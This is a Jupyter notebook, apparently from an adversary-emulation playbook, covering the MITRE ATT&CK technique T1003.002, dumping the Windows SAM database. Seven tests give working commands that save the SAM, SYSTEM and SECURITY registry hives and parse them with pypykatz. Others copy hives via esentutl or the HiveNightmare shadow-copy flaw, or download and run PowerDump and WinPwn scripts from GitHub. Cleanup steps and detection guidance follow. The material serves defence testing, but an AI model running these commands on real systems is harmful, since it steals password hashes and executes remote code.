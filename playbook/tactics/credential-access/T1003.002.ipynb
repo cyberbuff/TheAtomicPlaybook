{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "27a6c613",
   "metadata": {},
   "source": "# T1003.002 - Security Account Manager\nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n"
  },
  {
   "cell_type": "markdown",
   "id": "57d4671a",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f74cebb2",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Registry dump of SAM, creds, and secrets",
    "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59c08f03",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "6d1d855b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7be252b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6253486e",
   "metadata": {},
   "source": "### Atomic Test #2 - Registry parse with pypykatz\nParses registry hives to obtain stored credentials\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `command_prompt`!\n##### Description: Computer must have python 3 installed\n\n##### Check Prereq Commands:\n```cmd\npy -3 --version >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\necho \"Python 3 must be installed manually\"\n\n```\n##### Description: Computer must have pip installed\n\n##### Check Prereq Commands:\n```cmd\npy -3 -m pip --version >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\necho \"PIP must be installed manually\"\n\n```\n##### Description: pypykatz must be installed and part of PATH\n\n##### Check Prereq Commands:\n```cmd\npypykatz -h >nul 2>&1\nexit /b %errorlevel%\n\n```\n##### Get Prereq Commands:\n```cmd\npip install pypykatz\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c2c33bea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3e8de315",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\npypykatz live registry\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1e67362e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "4c280046",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - esentutl.exe SAM copy",
    "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nesentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3069e86",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "90f001e2",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\SAM >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ee918b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d66e21f9",
   "metadata": {},
   "source": "### Atomic Test #4 - PowerDump Hashes and Usernames from Registry\nExecutes a hashdump by reading the hashes from the registry.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PowerDump script must exist on disk at specified location\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1} \n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ac4b5462",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1dc23b2e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nWrite-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "028d1a12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "e763d6fa",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - dump volume shadow copy hives with certutil",
    "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nfor /L %a in (1,1,10) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\SAM\" %temp%\\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\\SAMvss*\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f63c5f0d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "d058584d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nfor /L %a in (1,1,10) do @(del %temp%\\SAMvss%a >nul 2>&1)\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dfa13bb1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cfd99fc5",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - dump volume shadow copy hives with System.IO.File",
    "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "148ff36e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "f5168393",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n1..10 | % {\n  rm \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "584d9e25",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "61bef785",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
    "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "76a9b3fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1003.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "05d1fe8c",
   "metadata": {},
   "source": "## Detection\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (<code>%SystemRoot%/system32/config/SAM</code>) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}